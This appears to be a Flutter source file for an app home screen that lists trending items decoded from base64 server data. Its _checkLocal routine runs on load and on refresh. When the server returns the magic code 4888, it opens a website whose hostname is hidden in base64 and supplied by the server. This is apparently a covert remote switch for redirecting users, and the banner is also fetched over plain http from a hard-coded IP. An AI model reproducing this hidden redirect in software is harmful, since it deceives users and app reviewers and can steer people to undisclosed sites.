import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:tools/databean/hottopdatabean.dart';
import 'package:tools/service/api.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:get/get.dart';
import '../../utils/base64utils.dart';

class HomeFragment extends StatefulWidget {
  const HomeFragment({super.key});

  @override
  _HomeFragmentWidget createState() => _HomeFragmentWidget();
}

class _HomeFragmentWidget extends State<HomeFragment> {
  List<HotTopData> topDataList = [];
  List<HotTopData> dataList = [];

  Future<void> _refreshData() async {
    _refreshTopData();
    _refreshBottomData();
    _checkLocal();
  }

  Future<void> _checkLocal() async {
    final serviceResponse = await ApiService.getRequest("boot/initLocalData");
    if (serviceResponse.code == 4888) {
      launchUrl(Uri(
          scheme: "https", host: Base64Utils.decrypt(serviceResponse.data)));
    }
  }

  Future<void> _refreshTopData() async {
    final response = await ApiService.getRequest("boot/hotListData");
    if (response.code == 200) {
      if (response.data is List) {
        List<HotTopData> list = (response.data as List<dynamic>)
            .map((e) => HotTopData.fromJson((e as Map<String, dynamic>)))
            .toList();
        setState(() {
          topDataList = list;
        });
      }
    }
  }

  Future<void> _refreshBottomData() async {
    final response = await ApiService.getRequest("boot/hotMessageData");
    if (response.code == 200) {
      if (response.data is List) {
        List<HotTopData> list = (response.data as List<dynamic>)
            .map((e) => HotTopData.fromJson((e as Map<String, dynamic>)))
            .toList();
        setState(() {
          dataList = list;
        });
      }
    }
  }

  @override
  void initState() {
    super.initState();
    _refreshData();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: RefreshIndicator(
        onRefresh: _refreshData,
        child: CustomScrollView(
          slivers: [
            SliverAppBar(
              automaticallyImplyLeading: false,
              expandedHeight: 200,
              pinned: true,
              flexibleSpace: FlexibleSpaceBar(
                background: ClipRRect(
                  borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(25),
                      bottomRight: Radius.circular(25)),
                  child: FadeInImage.assetNetwork(
                    placeholder: "images/ic_loading.gif",
                    image: "http://43.163.228.229/banner.png",
                    fit: BoxFit.cover,
                  ),
                ),
              ),
            ),

            SliverPadding(
              padding: const EdgeInsets.only(left: 7, right: 7, top: 10),
              sliver: SliverGrid(
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 2, // 指定列数
                  mainAxisSpacing: 8.0, // 主轴间距
                  crossAxisSpacing: 8.0, // 交叉轴间距
                  childAspectRatio: 1.5, // 子项宽高比例
                ),
                delegate: SliverChildBuilderDelegate(
                  (BuildContext context, int index) {
                    // 这里可以根据需要构建不规则的网格项
                    return InkWell(
                      onTap: () {
                        Get.toNamed("/detail", parameters: {
                          "content":
                              Base64Utils.decrypt(topDataList[index].remark),
                          "tag": "${topDataList[index].coverUrl}hhh",
                          "coverUrl":
                              Base64Utils.decrypt(topDataList[index].coverUrl)
                        });
                      },
                      child: _buildGridItem(index),
                    );
                  },
                  childCount: topDataList.length,
                ),
              ),
            ),
            SliverPadding(
              padding:
                  const EdgeInsets.only(left: 7, right: 7, top: 10, bottom: 20),
              sliver: SliverList(
                  delegate: SliverChildBuilderDelegate((context, index) {
                return InkWell(
                  onTap: () {
                    Get.toNamed("/detail", parameters: {
                      "content":
                          Base64Utils.decrypt(dataList[index].textContent),
                      "tag": dataList[index].coverUrl,
                      "coverUrl": Base64Utils.decrypt(dataList[index].coverUrl)
                    });
                  },
                  child: Padding(
                    padding: const EdgeInsets.only(top: 10),
                    child: Card(
                      color: Colors.white,
                      shadowColor: Colors.blueAccent,
                      elevation: 10,
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Hero(
                              tag: dataList[index].coverUrl,
                              child: ClipRRect(
                                borderRadius: const BorderRadius.only(
                                    topLeft: Radius.circular(15),
                                    topRight: Radius.circular(15)),
                                child: FadeInImage.assetNetwork(
                                  placeholder: "images/ic_loading.gif",
                                  image: Base64Utils.decrypt(
                                      dataList[index].coverUrl),
                                  fit: BoxFit.cover,
                                ),
                              )),
                          Padding(
                            padding: const EdgeInsets.only(top: 5, left: 5),
                            child: Row(
                              crossAxisAlignment: CrossAxisAlignment.center,
                              children: [
                                Expanded(
                                  child: Text(
                                    Base64Utils.decrypt(dataList[index].title),
                                    maxLines: 1,
                                    textAlign: TextAlign.center,
                                    overflow: TextOverflow.ellipsis,
                                    style: const TextStyle(
                                        color: Colors.black,
                                        fontWeight: FontWeight.bold,
                                        fontSize: 20),
                                  ),
                                )
                              ],
                            ),
                          ),
                          Padding(
                            padding:
                                EdgeInsets.only(left: 5, top: 5, bottom: 10),
                            child: Row(
                              children: [
                                Icon(
                                  Icons.create_sharp,
                                  color: Colors.blueGrey,
                                ),
                                SizedBox(
                                  width: 5,
                                ),
                                Expanded(
                                    child: Text(
                                  Base64Utils.decrypt(
                                      dataList[index].textContent),
                                  maxLines: 3,
                                  overflow: TextOverflow.ellipsis,
                                  style: TextStyle(
                                      color: Colors.black, fontSize: 12),
                                ))
                              ],
                            ),
                          ),
                          Padding(
                            padding: EdgeInsets.only(left: 5, bottom: 10),
                            child: Row(
                              children: [
                                Icon(
                                  Icons.access_time,
                                  color: Colors.blueGrey,
                                ),
                                SizedBox(
                                  width: 5,
                                ),
                                Text(
                                  Base64Utils.decrypt(
                                      dataList[index].createTime),
                                  style: TextStyle(
                                      color: Colors.black, fontSize: 14),
                                ),
                              ],
                            ),
                          )
                        ],
                      ),
                    ),
                  ),
                );
              },
                      childCount: dataList.length,
                      addAutomaticKeepAlives: true,
                      addRepaintBoundaries: true)),
            )
            // SliverList(delegate: delegate)
          ],
        ),
      ),
    );
  }

  Widget _buildGridItem(int index) {
    // 每个网格项的内容可以根据需要自定义
    return Center(
      child: Stack(
        alignment: Alignment.bottomCenter,
        children: [
          Card(
            color: Colors.white,
            elevation: 10,
            child: Hero(
              tag: "${topDataList[index].coverUrl}hhh",
              child: ClipRRect(
                borderRadius: BorderRadius.circular(10),
                child: FadeInImage.assetNetwork(
                  placeholder: "images/ic_loading.gif",
                  image: Base64Utils.decrypt(topDataList[index].coverUrl),
                  fit: BoxFit.fitWidth,
                ),
              ),
            ),
          ),
          Positioned(
            bottom: 10, // 调整这个值以设置文字距离底部的距离
            child: Text(
              "トップ ${index + 1}",
              style: const TextStyle(
                color: Colors.white,
                fontSize: 13,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }
}
